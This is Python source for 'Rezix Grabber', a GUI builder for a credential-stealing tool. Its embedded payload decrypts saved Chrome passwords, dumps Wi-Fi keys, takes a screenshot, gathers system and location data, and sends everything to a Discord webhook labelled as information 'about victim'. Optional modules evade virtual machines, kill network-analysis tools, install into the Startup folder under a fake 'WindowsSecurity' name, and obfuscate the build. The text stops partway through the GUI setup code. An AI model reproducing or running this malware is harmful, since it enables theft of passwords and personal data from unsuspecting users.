# Coded By DeadSkajp#5906
# TK from vesper, cuz im ass at it, but its custumized!
import os,sys,requests,re,marshal,base64,zlib,shutil
from tkinter import *
from tkinter import messagebox
from tkinter.filedialog import askopenfilename
import webbrowser
from discord_webhook import DiscordWebhook, DiscordEmbed
from time import sleep
window = Tk()
window.title("Rezix Grabber v1")
window.geometry("782x475")
window.maxsize(782, 475)
window.minsize(782, 475)
window.iconbitmap("assets/mylogo.ico")
window.config(background='#484848')
bg1 = PhotoImage(file='assets/background1.png')
bg = PhotoImage(file='assets/background.png')
setupbu = PhotoImage(file='assets/img0.png')
setupbu2 = PhotoImage(file='assets/img0e.png')
settingbu = PhotoImage(file='assets/img2.png')
settingbu2 = PhotoImage(file='assets/img2e.png')
aboutbu = PhotoImage(file='assets/img1.png')
aboutbu2 = PhotoImage(file='assets/img1e.png')
browsebu = PhotoImage(file='assets/img4.png')
blankbu = PhotoImage(file='assets/blankbu.png')
fullbu = PhotoImage(file='assets/fullbu.png')
testbu = PhotoImage(file='assets/img5.png')
buildbu = PhotoImage(file='assets/buidbu.png')
checkbu = PhotoImage(file='assets/checkbu.png')
installbu = PhotoImage(file='assets/installbu.png')
bg3 = PhotoImage(file='assets/settingbg.png')
bg4 = PhotoImage(file='assets/aboutbg.png')
insta = PhotoImage(file='assets/ig.png')
ytb = PhotoImage(file='assets/yt.png')
disco = PhotoImage(file='assets/dsc.png')
paypa = PhotoImage(file='assets/PayPal.png')
fc = PhotoImage(file='assets/fc.png')
fb = PhotoImage(file='assets/fb.png')
Rezix_Grabber = r'''
# Grabber Coded by DeadSkajp#5906
# Discord server: https://discord.gg/gUVF7nNuQ8
# Website: https://rezix.tk/

# Debug is giving output to console, if you want to see it just don't click on 'no console in builder'
debug = 0

import requests, json, os, sys, base64, shutil, sqlite3, platform, psutil, subprocess
from discord_webhook import DiscordWebhook, DiscordEmbed
from PIL import ImageGrab
from datetime import datetime
from sqlite3 import connect
from collections import Counter 
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES

if debug == 1:print("/1> Grabber Started")

# Path for txts and screenshot
tmpPath = "C:\Windows\Temp"
if debug == 1:print(f"/2> Temp Path Set To: {tmpPath}")

# Delete some things
os.system(f'if exist {tmpPath}\ChromeData.db del /F /S /Q {tmpPath}\ChromeData.db >nul && echo. >> {tmpPath}\ChromeData.db')
os.system(f'if exist {tmpPath}\Pass.txt del /F /S /Q {tmpPath}\Pass.txt >nul && echo. >> {tmpPath}\Pass.txt')
os.system(f'if exist {tmpPath}\mails.txt del /F /S /Q {tmpPath}\mails.txt >nul && echo/ >> {tmpPath}\mails.txt')
subprocess.call(f'if exist {tmpPath}\whoami.txt del /F /S /Q {tmpPath}\whoami.txt {tmpPath}\os.txt {tmpPath}\cf1.txt {tmpPath}\8888.txt {tmpPath}\screen.jpg {tmpPath}\misc.txt {tmpPath}\osname1.txt >nul', shell=True) # Deletes files if they exist
if debug == 1:print("/3> Deleted Files From Previous Grab")

if debug == 1:print("/4> Setting Up Password & Gmail Grab")
# Grab Email and Passwords in google
def get_encryption_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
    def decrypt_payload2(cipher, payload):
        return cipher.decrypt(payload)
    def generate_cipher2(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    def decrypt_password2(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher2(master_key, iv)
            decrypted_pass = self.decrypt_payload2(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:pass
if debug == 1:print("/5> Password & Mail Grab Set")
# Grab Emails
db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
filename = f"{tmpPath}/ChromeData.db"
shutil.copyfile(db_path, filename)
db = connect(filename)
cursor = db.cursor()
cursor.execute("select username_value from logins order by date_created")
usernames = []
for row in cursor.fetchall():
    dataz = "=== Rezix Grabber ==="
    username = row[0] 
    if "@" in username:
        usernames.append((username))
    else:
        continue
def get_duplicates(values):
    return [key for key in Counter(values).keys() if Counter(values)[key]>1]
duplicates = get_duplicates(usernames)
emails = []
for name in duplicates:
    with open(f'{tmpPath}\mails.txt', 'a', encoding='utf-8') as file:
        file.write(f"Gmail: {name}\n")
os.system(f'if not exist {tmpPath}\mails.txt echo No Emails Found >> {tmpPath}\mails.txt')

if debug == 1:print("/6> Mails Grabbed")

# Grab Passwords
local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
key = get_encryption_key(local_state_path)
db = connect(filename)
cursor = db.cursor()
cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
for row in cursor.fetchall():
    dataz = "=== Rezix Grabber ==="
    origin_url = row[0]
    action_url = row[1]
    username = row[2]
    password = decrypt_password(row[3], key)
    dcreate = row[4]
    dlu = row[5]        
    if username or password:
        dataz += f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nGOOGLE CHROME\n"
        dataz += "=====================\n\n"
        with open(f'{tmpPath}\Pass.txt', 'a', encoding='utf-8') as file:
            file.write(dataz)
    else:
        continue
os.system(f'if not exist {tmpPath}\Pass.txt echo No Password Found >> {tmpPath}\Pass.txt')

if debug == 1:print("/7> Passwords Grabbed")
db.close()
if debug == 1:print("/8> Setting Up PC Spec Scraper")
# Get PC Specs
cpufreq = psutil.cpu_freq()
boot_time_timestamp = psutil.boot_time()
bt = datetime.fromtimestamp(boot_time_timestamp)
net_io = psutil.net_io_counters()
def get_size(bytes, suffix="B"): # Convert Size
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor
if debug == 1:print("/8> PC Spec Scraper Set")
if debug == 1:print("/9> Creating TxTs (will take a moment)")
# Create TXTs
subprocess.call(f'whoami >> {tmpPath}/whoami.txt', shell=True) # Who am i?
subprocess.call(f'PING -n 1 1.1.1.1 | FIND "TTL=" >> {tmpPath}/cf1.txt', shell=True) # Ping cloudflare
subprocess.call(f'PING -n 1 8.8.8.8 | FIND "TTL=" >> {tmpPath}/8888.txt', shell=True) # Ping google
subprocess.call(f'ver >> {tmpPath}/os.txt', shell=True) # Get windows version
subprocess.call(f'echo IP Config:>> {tmpPath}/misc.txt && ipconfig >> {tmpPath}/misc.txt', shell=True) # Get IP config
subprocess.call(f"echo. >> {tmpPath}/misc.txt&& echo -------------------------------------- >> {tmpPath}/misc.txt&&echo Wifi Passwords:>> {tmpPath}/misc.txt", shell=True) # Foreplay for wifi grab passwords
subprocess.call(f"for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> {tmpPath}/misc.txt", shell=True) # Grabbing wifi passwords and saving it to misc.txt
subprocess.call(f'echo. >> {tmpPath}/misc.txt&& echo -------------------------------------- >> {tmpPath}/misc.txt&& echo Task List:>> {tmpPath}/misc.txt && tasklist >> {tmpPath}/misc.txt', shell=True) # Get tasks running on pc and save it to misc.txt
subprocess.call(f'echo. >> {tmpPath}/misc.txt&& echo -------------------------------------- >> {tmpPath}/misc.txt&& echo Active CHCP:>> {tmpPath}/misc.txt && chcp >> {tmpPath}/misc.txt', shell=True) # Get active chcp and save it into misc.txt
subprocess.call(f'echo. >> {tmpPath}/misc.txt&& echo -------------------------------------- >> {tmpPath}/misc.txt&& echo System info:>> {tmpPath}/misc.txt && systeminfo >> {tmpPath}/misc.txt', shell=True) # Get system info and save it to misc.txt
subprocess.call(f'echo. >>{tmpPath}/osname.txt && systeminfo | findstr /B /C:"OS Name">> {tmpPath}/osname1.txt', shell=True) # Get windows gen
if debug == 1:print("/10> TxTs Created")

if debug == 1:print("/11> Converting TxTs to Variables")
with open(f'{tmpPath}/os.txt', 'r') as fr: # Custumize variable
    lines = fr.readlines()
    ptr = 1
    with open(f'{tmpPath}/os.txt', 'w') as fw:
        for line in lines:
            if ptr != 1:
                fw.write(line)
            ptr += 1

with open(f'{tmpPath}/mails.txt', 'r') as fr: # Custumize variable
    lines = fr.readlines()
    if lines[0] == "No Emails Found":
        fw.write(lines[0])
    else:
        ptr = 1
        with open(f'{tmpPath}/mails.txt', 'w') as fw:
            for line in lines:
                if ptr != 1:
                    fw.write(line)
                ptr += 1

# Set paths for txts
userFile = f"{tmpPath}/whoami.txt"
osFile = f"{tmpPath}/os.txt"
osNameFile = f"{tmpPath}/osname1.txt"
Ping1111File = f"{tmpPath}/cf1.txt"
Ping8888File = f"{tmpPath}/8888.txt"
MailsFile = f"{tmpPath}\mails.txt"

# Read txts
with open(userFile) as file:
    User = (file.read())
with open(osFile) as file:
    OS = (file.read())
with open(Ping1111File) as file:
    Ping1111 = (file.read())
with open(Ping8888File) as file:
    Ping8888 = (file.read())
with open(osNameFile) as file:
    osName = (file.read())
with open(MailsFile) as file:
    mails = (file.read())
    if "@" in mails:
        print("/!!> Mails Found")
    else:
        mails = "No Mails Found"
        print("/!!> No Mails Found")

if debug == 1:print("/12> All TxTs Converted To Variables")

if debug == 1:print("/13> Taking Screenshot")
# Take screenshot
screeny = ImageGrab.grab(bbox=None,include_layered_windows=True,all_screens=True,xdisplay=None)
screeny.save(f"{tmpPath}/screen.jpg")

# IP location urls and json
ipv4 = "https://ipinfo.io/json"
ipinf = "https://ipapi.co/json/"
stats = requests.get(ipinf)
json_stats = stats.json()
stats1 = requests.get(ipv4)
json_stats1 = stats1.json()

if debug == 1:print("/14> Getting Location & IP")
# Get json strings (at the left what it outputs)
try:
    print("/15> IP & Location Grabbed")
    ip = json_stats["ip"] # 1.1.1.1
    network = json_stats["network"] # 1.1.1.1/24
    city = json_stats["city"] # Sydney
    region = json_stats["region"] # New South Wales
    regcode = json_stats["region_code"] # NSW
    countryname = json_stats["country_name"] # Australia
    countrycode = json_stats["country_code"] # AU
    tld = json_stats["country_tld"] # .au
    contcode = json_stats["continent_code"] # OC
    postal = json_stats["postal"] #2000
    Lag = json_stats["latitude"] # -33.859336
    Long = json_stats["longitude"] # 151.203624
    timezone = json_stats["timezone"] # Australia/Sydney
    utc_off = json_stats["utc_offset"] # +1100
    call = json_stats["country_calling_code"] # +61
    cur = json_stats["currency"] # AUD
    lang = json_stats["languages"] # en-AU
    org = json_stats["asn"] + ", " + json_stats["org"] # AS13335, CLOUDFLARENET
except KeyError as ke:
    print('/15> IP & Location Error')
    ip = json_stats1["ip"]
    network = "?"
    city = json_stats1["city"]
    region = json_stats1["region"]
    regcode = "?"
    countryname = "?"
    countrycode = json_stats1["country"]
    countrycap = "?"
    tld = "?"
    contcode = "?"
    postal = json_stats1["postal"]
    Lag = "?"
    Long = "?"
    timezone = json_stats1["timezone"]
    utc_off = "?"
    call = "?"
    cur = "?"
    lang = "?"
    org = json_stats1["org"]

if debug == 1:print("/16> Creating Webhook, Embed And Uploading Files")
# Google maps link
googlemap = "https://www.google.com/maps/search/google+map++" + json_stats1['loc']
# Set webhook names
webhook = DiscordWebhook(url=webhookw, username="Logger | Project Rezix", avatar_url="https://i.imgur.com/JTXOj5G.jpg")
webhook1 = DiscordWebhook(url=webhookw, username="Logger | Project Rezix", avatar_url="https://i.imgur.com/JTXOj5G.jpg") # Second for screenshot and misc.txt
# Creating embed YEY
embed = DiscordEmbed(  # Title of embed
    title="Logged info about victim", description="", color='404040'
)
embed.set_author(  # Creating author of embed
    name="Project Rezix",
    url="https://rezix.tk",
    icon_url="https://i.imgur.com/JTXOj5G.jpg",
)
embed.set_footer(text="By DeadSkajp#5906 | https://discord.gg/gUVF7nNuQ8") # Footer of embed
embed.set_timestamp() # Adding timestamp

embed.add_embed_field(name="\nBasic Info", value=f"User: {User}{osName}OS Ver: {OS}```Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}\nCPU Type: {platform.processor()}\nCPU Physical Cores: {psutil.cpu_count(logical=False)}\nCPU Logical Cores: {psutil.cpu_count(logical=True)}\nTotal RAM: {round(psutil.virtual_memory().total/1000000000, 2)} GB\nMachine Type: {platform.machine()}\n```", inline=False) # Basic Info
embed.add_embed_field(name="IP Info", value=f"Google Maps: [Open in browser]({googlemap})```IP: {ip}\nNetwork: {network}\nCity: {city}\nRegion: {region}\nRegion Code: {regcode}\nCountry: {countryname}\nContinent: {contcode}\nTimezone: {timezone}\nPostal: {postal}\nORG: {org}\nLocation: {Lag}, {Long}\nCalling Code: {call}\nCountry TLD: {tld}\n```", inline=True) # IP resolver
embed.add_embed_field(name="Network Ping / Misc", value=f"```{Ping1111}\n{Ping8888}\nTotal Bytes Sent: {get_size(net_io.bytes_sent)}\nTotal Bytes Received: {get_size(net_io.bytes_recv)}\n```", inline=True) # Network misc
embed.add_embed_field(name="Gmail Used", value=f"```{mails}```", inline=False) # Network misc
embed.add_embed_field(name="About Project Rezix", value="`Created by:` [DeadSkajp#5906](https://discordapp.com/users/527506330630619146)\n`Discord Server:` https://discord.gg/gUVF7nNuQ8\n`Website:` https://rezix.tk/", inline=False) # Copyright

with open(f"{tmpPath}/screen.jpg", "rb") as f: # Add screenshot to second webhook
    webhook1.add_file(file=f.read(), filename='screen.jpg')
with open(f"{tmpPath}/misc.txt", "rb") as f: # Add misc.txt to second webhook
    webhook1.add_file(file=f.read(), filename='misc.txt')
with open(f"{tmpPath}/Pass.txt", "rb") as f: # Add passwords.txt to second webhook
    webhook1.add_file(file=f.read(), filename='Passwords.txt')
if debug == 1:print("/17> Sending Embed And Files")
webhook.add_embed(embed) # Asing embed to first webhook
subprocess.call(f'del /F /S /Q {tmpPath}\whoami.txt {tmpPath}\os.txt {tmpPath}\cf1.txt {tmpPath}\8888.txt {tmpPath}\screen.jpg {tmpPath}\misc.txt {tmpPath}\osname1.txt {tmpPath}\Pass.txt {tmpPath}\mails.txt {tmpPath}\ChromeData.db >nul', shell=True) # Delete created txtx and screenshot
if debug == 1:print("/18> Temp Files Deleted")
response = webhook.execute() # send first webhook (embed)
response = webhook1.execute() # send second webhook (screenshot, misc.txt)
if debug == 1:print("/19> Everything Sended")
if debug == 1:print("/20> Thanks For Using Rezix Grabber | by DeadSkajp#5906")
'''

class Rezix:
    def __init__(self):
        self.antivmcode = ''
        self.antiprocesscode=''
        self.startupcode = ''
        self.antivm = False
        self.antiprocess = False
        self.obfuscate = False
        self.addstartup = False
        self.noconsole = False
        self.errormsg = False
        self.upxcomp = False
        self.setup()
    def browseico(self):
        self.iconname = askopenfilename(filetypes=(("ico files","*.ico"),("All files","*.*")))
        messagebox.showinfo('Rezix Grabber', f'File Chose : {self.iconname}')
    def antivmlol(self):
        if self.antivm == False:self.antivm=True;self.antivmb.config(image=fullbu);self.antivmcode=r"""
try:
    import os
    import sys
    from psutil import process_iter
    if os.path.exists("C:\WINDOWS\system32\drivers\vmci.sys"):sys.exit()
    if os.path.exists("C:\WINDOWS\system32\drivers\vmhgfs.sys"):sys.exit()
    if os.path.exists("C:\WINDOWS\system32\drivers\vmmouse.sys"):sys.exit()
    if os.path.exists("C:\WINDOWS\system32\drivers\vmusbmouse.sys"):sys.exit()
    if os.path.exists("C:\WINDOWS\system32\drivers\vmx_svga.sys"):sys.exit()
    if os.path.exists("C:\WINDOWS\system32\drivers\VBoxMouse.sys"):sys.exit()
    for Rezix in process_iter():
        if Rezix.name().lower() == "vmsrvc.exe".lower() or Rezix.name().lower() == "vmusrvc.exe".lower() or Rezix.name().lower() == "vboxtray.exe".lower() or Rezix.name().lower() == "vmtoolsd.exe".lower() or Rezix.name().lower() == "vboxservice.exe".lower():sys.exit()
except:pass
        """
        else:self.antivm=False;self.antivmb.config(image=blankbu);self.antivmcode=''
    def antiprocesslol(self):
        if self.antiprocess==False:self.antiprocess=True;self.antiprocessb.config(image=fullbu);self.antiprocesscode=r"""
try:       
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
    def Rezixend(Rezixnamez):
        for Rezixproc in process_iter():
            try:
                for ki in Rezixnamez: 
                    if ki.lower() in Rezixproc.name().lower():Rezixproc.kill()
            except (NoSuchProcess, AccessDenied, ZombieProcess):pass
    def Rezixstart():Rezixnames = ['http', 'traffic', 'wireshark', 'fiddler', 'packet', 'process'];return Rezixend(Rezixnamez=Rezixnames)  
    Rezixstart()
except:pass
        """
        else:self.antiprocess=False;self.antiprocessb.config(image=blankbu);self.antiprocesscode=''
    def obfuscatelol(self):
        if self.obfuscate == False:self.obfuscate=True;self.obfuscateb.config(image=fullbu)
        else:self.obfuscate=False;self.obfuscateb.config(image=blankbu)
    def addstartuplol(self):
        if self.addstartup==False:self.addstartup=True;self.addstartupb.config(image=fullbu);self.startupcode=r"""
from sys import argv;import getpass
user = getpass.getuser()
file = argv[0]
try:
    ext =file.split("\\")[-1].split('.')[-1]
    poop = open(file, 'rb')
    okpoopinpants = poop.read()
    with open(f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.{ext}', 'wb') as f:
        f.write(okpoopinpants)
except:pass      
        """
        else:self.addstartup=False;self.addstartupb.config(image=blankbu);self.startupcode=''
    def noconsolelol(self):
        if self.noconsole==False:self.noconsole=True;self.noconsoleb.config(image=fullbu)
        else:self.noconsole=False;self.noconsoleb.config(image=blankbu)
    def upxcomplol(self):
        if self.upxcomp==False:self.upxcomp=True;self.upxcompbu.config(image=fullbu)
        else:self.upxcomp=False;self.upxcompbu.config(image=blankbu)
    def testwebhook(self):
        try:
            webhookz = self.webhook.get()
            a = True
        except:messagebox.showerror('Rezix Grabber', 'Invalid Webhook');a=False
        if a == True:
            try:
                webhook = DiscordWebhook(url=webhookz, username="Rezix", avatar_url=r"https://i.imgur.com/JTXOj5G.jpg")
                embed = DiscordEmbed(title=f"Working", description=f"```Webhook is working!```", color='BCC0C0')
                embed.set_author(name="Project Rezix", icon_url=r'https://i.imgur.com/JTXOj5G.jpg', url="https://rezix.tk/")
                embed.set_footer(text='By DeadSkajp#5906')
                embed.set_timestamp()
                webhook.add_embed(embed)
                response = webhook.execute()
            except:messagebox.showerror('Rezix Grabber', 'Invalid Webhook')
    def errormsglol(self):
        if self.errormsg==False:self.errormsg=True;self.errormsgb.config(image=fullbu)
        else:self.errormsg=False;self.errormsgb.config(image=blankbu)
    def installrequirements(self):
        try:
            os.system('cd assets && requirements.bat && cd ..')
            messagebox.showinfo('Rezix Grabber', 'Successfully Installed Requirements! You can now setup and build your grabber')
        except:messagebox.showerror('Rezix Grabber','Error Occured! Make sure you have Python in PATH')
    def installpython(self):
        try:
            webbrowser.open('https://www.python.org/ftp/python/3.9.5/python-3.9.5-amd64.exe')
            messagebox.showinfo('Rezix Grabber','Make sure to add python to PATH')
        except:messagebox.showerror('Rezix Grabber', 'Error Occured')
    def youtube(self):
        webbrowser.open('https://www.youtube.com/channel/UCyeodxAgQ0j8zaaYiWgNjkA?sub_confirmation=1')
    def discord(self):
        webbrowser.open('https://discord.gg/gUVF7nNuQ8')
    def paypal(self):
        webbrowser.open('https://www.paypal.com/donate/?hosted_button_id=YT6S6HXJK6JWE')
    def checkversion(self):
        try:
            messagebox.showinfo('Rezix Grabber', f'Your version : {sys.version}')
        except:messagebox.showerror('Rezix Grabber', 'You dont have python. Please install it from this website: https://python.org/')
    def compileexe(self):
        os.system('start ./assets/building.vbs')
        isicon = True
        name = self.name.get()
        if len(name) < 1:
            name = "Default"
        try:
            icon = self.iconname
            if os.path.exists(icon):
                pass
            else:
                isicon=False
        except:isicon=False
        sleep(1)
        if isicon and self.noconsole and self.upxcomp == False:
            os.system(f'Python -m PyInstaller --onefile --name {name} --icon {icon} --noconsole --clean --log-level=INFO --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB.py')
        elif isicon and self.noconsole and self.upxcomp:
            os.system(f'Python -m PyInstaller --onefile --name {name} --icon {icon} --noconsole --clean --log-level=INFO --upx-dir ./assets --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB.py')
        elif isicon == False and self.noconsole and self.upxcomp == False:
            os.system(f'Python -m PyInstaller --onefile --name {name} --noconsole --clean --log-level=INFO --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB.py')
        elif isicon == False and self.noconsole and self.upxcomp:
            os.system(f'Python -m PyInstaller --onefile --name {name} --noconsole --clean --log-level=INFO --upx-dir ./assets --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB.py')
        elif isicon and self.noconsole == False and self.upxcomp == False:
            os.system(f'Python -m PyInstaller --onefile --name {name} --icon {icon} --clean --log-level=INFO --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB.py')
        elif isicon and self.noconsole == False and self.upxcomp:
            os.system(f'Python -m PyInstaller --onefile --name {name} --icon {icon} --clean --log-level=INFO --upx-dir ./assets --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB.py')
        elif isicon == False and self.noconsole == False and self.upxcomp == False:
            os.system(f'Python -m PyInstaller --onefile --name {name} --clean --log-level=INFO --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB.py')
        elif isicon == False and self.noconsole == False and self.upxcomp:
            os.system(f'Python -m PyInstaller --onefile --name {name} --clean --log-level=INFO --upx-dir ./assets --hidden-import="sqlite3" --hidden-import="win32crypt" --hidden-import="Cryptodome" --hidden-import="Cryptodome.Cipher.AES" --hidden-import="pycryptodomex" --hidden-import="platform" --hidden-import="cpuinfo" --hidden-import="requests" --hidden-import="psutil" --hidden-import="discord_webhook"  --hidden-import="PIL.ImageGrab" --hidden-import="PIL" GraB.py')
        try:
            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\exes\\{name}.exe")
            bgg2= Label(window, image=fc, borderwidth=0,bg='#242424')
            bgg2.place(x=568,y=390)
            os.system(f'del /F /S /Q GraB.py {name}.spec >nul')
            shutil.rmtree('build')
            shutil.rmtree('dist')
            shutil.rmtree('__pycache__')
            self.compile()
        except:
            try:
                shutil.rmtree('build')
                shutil.rmtree('dist')
                shutil.rmtree('__pycache__')
                os.system(f'del /F /S /Q GraB.py {name}.spec >nul')
                messagebox.showerror('Rezix Grabber', 'Something went wrong!');self.compile()
            except:pass

    def obfuscatethis(self):
        b64 = lambda _monkay : base64.b64encode(_monkay)
        mar = lambda _monkay : marshal.dumps(compile(_monkay,'Rezix_Grabber','exec'))
        zlb = lambda _monkay : zlib.compress(_monkay)
        file = open('GraB.py','r')
        a = file.read()
        for x in range(3):
            method = repr(b64(zlb(mar(a.encode('utf8'))))[::-1])
            data = "exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))" % method
        z = []
        for i in data:
            z.append(ord(i))
        beforemarsh ="_ = %s\nexec(''.join(chr(__) for __ in _))" % z
        marsrc = compile(beforemarsh, 'Get_Rekt_By_Skajp', 'exec')
        obfmarsh = marshal.dumps(marsrc)
        t = zlib.compress(obfmarsh)
        code = f"import marshal,zlib;exec(marshal.loads(zlib.decompress({t})))"
        file.close()
        with open('GraB.py', 'w+') as f:
            f.write(code)
        return True
    def makefile(self):
        webhook = self.webhook.get()
        filecont = fr"""
{self.antivmcode}
{self.antiprocesscode}
{self.startupcode}
{self.binda}
{self.errormsgcode}
webhookw = "{webhook}"
{Rezix_Grabber}
            """
        marsrc = compile(filecont, 'By_Skajp', 'exec')
        encode1 = marshal.dumps(marsrc)
        code = f"import marshal;exec(marshal.loads({encode1}))"
        with open('GraB.py', 'w+') as f:
            f.write(code)
            f.close()
        if self.obfuscate == True:
            if self.obfuscatethis() == True:
                self.compileexe()
        else:
            self.compileexe()
        
    def verifyshit(self):
        meow = False
        while True:
            #check webhook
            webhook = self.webhook.get()
            if "discord.com" in webhook or "discordapp.com" in webhook:
                x = requests.get(webhook)
                if x.status_code ==200:
                    pass
                else:messagebox.showerror('Rezix Grabber','Invalid Webhook');break
            else:messagebox.showerror('Rezix Grabber','Invalid Webhook');break
            # verify name
            name = self.name.get()
            try:
                new_name = name.replace(" ","_")
            except:pass
            try:
                googleshare = self.googleshare.get()
            except:self.binda = ""
            if self.errormsg == True:
                emsg = self.errormsge.get()
                if len(emsg) > 1:
                    self.errormsgcode = fr"""
try:
    import os
    with open('C:\Windows\Temp\GetRektByRezix.vbs','w') as e:
        e.write('''
x=MsgBox("{emsg}", vbOkOnly+vbCritical, "Rekt By Project Rezix")
        ''')
        e.close()
    os.system('start C:\Windows\Temp\GetRektByRezix.vbs')
except:pass
                    """
                else:messagebox.showerror('Rezix Grabber', 'Invalid Message For Custom Message');self.errormsgcode="";break
            else:self.errormsgcode =""
            meow = True;break
        if meow == False:
            self.compile()
        else:
            self.makefile()

    def setup(self):
        bgg1 = Label(window, image=bg1, borderwidth=0)
        bgg1.place(x=0, y=0)
        bgg = Label(window, image=bg, borderwidth=0)
        bgg.place(x=166, y=0)
        #tabs
        self.gotosettings = Button(window, image=settingbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.settings)
        self.gotosettings.place(x=-3,y=238)
        self.gotoabout = Button(window, image=aboutbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.about)
        self.gotoabout.place(x=-3,y=298)
        self.gotosetup = Button(window, image=setupbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        self.gotosetup = Button(window, image=setupbu2,bg='#474747',borderwidth=0, activebackground="#474747",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        ####setup gui####
        #not optional
        self.webhook = Entry(window,text='b',font=('SeoulHangang',10),bg='#989898', fg='#474747',width=20,borderwidth=0)
        self.webhook.place(x=222, y=80)
        testwbh = Button(window, image=testbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.testwebhook)
        testwbh.place(x=353,y=77)
        #optional
        browse = Button(window, image=browsebu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.browseico)
        browse.place(x=348,y=184)
        build = Button(window, image=buildbu,bg='#242424',borderwidth=0, activebackground="#242424", command=self.verifyshit)
        build.place(x=535,y=335)
        self.name = Entry(window,text='a',font=('SeoulHangang',10),bg='#989898', fg='#474747',width=29,borderwidth=0)
        self.name.place(x=222, y=141)
        if self.antivm == False:
            self.antivmb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antivmlol)
            self.antivmb.place(x=694,y=41)
        else:
            self.antivmb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antivmlol)
            self.antivmb.place(x=694,y=41)
        if self.antiprocess == False:
            self.antiprocessb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antiprocesslol)
            self.antiprocessb.place(x=694,y=79)
        else:
            self.antiprocessb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.antiprocesslol)
            self.antiprocessb.place(x=694,y=79)
        if self.obfuscate == False:
            self.obfuscateb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.obfuscatelol)
            self.obfuscateb.place(x=694,y=118)
        else:
            self.obfuscateb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.obfuscatelol)
            self.obfuscateb.place(x=694,y=118)
        if self.addstartup== False:
